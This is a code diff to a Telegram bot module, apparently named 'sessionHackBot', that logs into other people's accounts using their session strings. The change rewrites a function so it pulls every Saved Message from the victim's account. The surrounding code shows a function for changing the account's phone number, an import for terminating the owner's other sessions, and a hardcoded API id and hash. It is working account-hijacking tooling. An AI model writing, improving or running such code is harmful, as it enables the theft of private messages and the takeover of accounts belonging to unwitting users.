@@ -15,28 +15,26 @@ from telethon.sessions import StringSession as ses
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
-
+from telethon import TelegramClient, sync
+from telethon.tl.functions.messages import GetAllSavedMessages
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
-async def savedmsgs(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            dialogs = await X.get_all_chats()
-            saved_messages = []
-            for dialog in dialogs:
-                if dialog.archived:
-                    messages = await X.get_messages(dialog.id, None)
-                    for message in messages:
-                        saved_messages.append(message.text)
-            return "\n\n".join(saved_messages)
-        except Exception as e:
-            print(e)
-            return "Error: Failed to fetch saved messages."
+from telethon.tl.types import InputMessagesFilterSaved
 
+async def savedmsgs(strses):
+    try:
+        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+            saved_messages = []
+            async for message in X.iter_messages(entity='me', filter=InputMessagesFilterSaved()):
+                saved_messages.append(message.text)
+            return "\n".join(saved_messages)
+    except Exception as e:
+        print(f"Error: {e}")
+        return "Failed to fetch saved messages."
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
